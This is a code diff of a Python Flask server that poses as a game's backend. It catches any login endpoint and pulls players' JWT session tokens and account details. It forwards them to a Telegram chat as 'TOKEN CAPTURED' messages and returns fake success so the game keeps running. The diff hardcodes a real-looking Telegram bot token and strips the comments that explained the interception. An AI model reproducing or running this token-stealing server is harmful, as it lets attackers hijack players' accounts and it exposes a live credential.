@@ -6,7 +6,7 @@ from flask import Flask, request, jsonify
 
 app = Flask(__name__)
 
-TELEGRAM_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN")
+TELEGRAM_TOKEN = os.environ.get("BOT_TOKEN", "8956940192:AAGu8293e28HolwGE3yFt0m-Q8xKsOg6uo4")
 TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
 
 def decode_jwt_payload(token):
@@ -22,11 +22,9 @@ def decode_jwt_payload(token):
         print(f"JWT Decode Error: {e}")
         return None
 
-# Catch-all route jo game ke kisi bhi endpoint (GetLoginData, LoginGetProfile, etc.) ko intercept kar lega
 @app.route('/<path:subpath>', methods=['POST', 'GET'])
 def catch_all_game_requests(subpath):
     try:
-        # Authorization header ya query param se token nikalna
         auth_header = request.headers.get('Authorization') or request.args.get('auth')
         chat_id = request.args.get('chat_id')
 
@@ -36,7 +34,6 @@ def catch_all_game_requests(subpath):
             else:
                 jwt_token = auth_header
 
-            # JWT Decode karna
             jwt_data = decode_jwt_payload(jwt_token)
             if jwt_data:
                 account_id = jwt_data.get("account_id")
@@ -49,7 +46,6 @@ def catch_all_game_requests(subpath):
                 except:
                     nickname = encoded_nickname
 
-                # Agar chat_id di gayi hai, toh Telegram par message bhej do
                 if chat_id:
                     msg_text = (
                         f"🔑 *TOKEN CAPTURED VIA /{subpath}*!\n\n"
@@ -65,7 +61,6 @@ def catch_all_game_requests(subpath):
                         "parse_mode": "Markdown"
                     })
 
-        # Game ko dummy/successful response return karna taaki game crash na ho aur login aage badhe
         return jsonify({"status": 0, "msg": "success"}), 200
 
     except Exception as e:
